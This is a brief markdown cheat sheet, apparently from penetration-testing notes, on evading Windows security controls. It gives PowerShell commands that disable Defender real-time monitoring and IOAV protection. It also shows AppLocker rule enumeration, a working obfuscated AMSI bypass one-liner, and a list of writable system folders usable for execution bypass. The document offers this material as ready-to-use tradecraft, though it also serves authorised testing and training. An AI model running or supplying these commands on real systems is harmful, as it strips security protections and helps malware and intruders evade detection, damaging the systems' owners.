# Antivirus & Detections

## Windows Defender

### Check Status of Defender

- **PowerShell Commands:**
  ```powershell
  Get-MpComputerStatus
  ```

- **Firewall Status Commands:**
  ```powershell
  netsh advfirewall show domain
  netsh advfirewall show private
  netsh advfirewall show public
  ```

### Disable Real-Time Monitoring

- **PowerShell Command:**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
  ```

- **Disable IOAV Protection:**
  ```powershell
  Set-MpPreference -DisableIOAVProtection $true
  ```

---

## AppLocker Enumeration

### With the GPO

- Registry Key Location: 
  ```
  HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
  ```
  - Keys: `Appx`, `Dll`, `Exe`, `Msi`, and `Script`.

### List AppLocker Rules

- **PowerShell Command:**
  ```powershell
  $a = Get-ApplockerPolicy -effective
  $a.rulecollections
  ```

---

## PowerShell

### Default PowerShell Locations in a Windows System

- `C:\windows\syswow64\windowspowershell\v1.0\powershell`
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell`

### Example of AMSI Bypass

- **PowerShell Command:**
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
  ```

---

## Default Writeable Folders

- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`
```
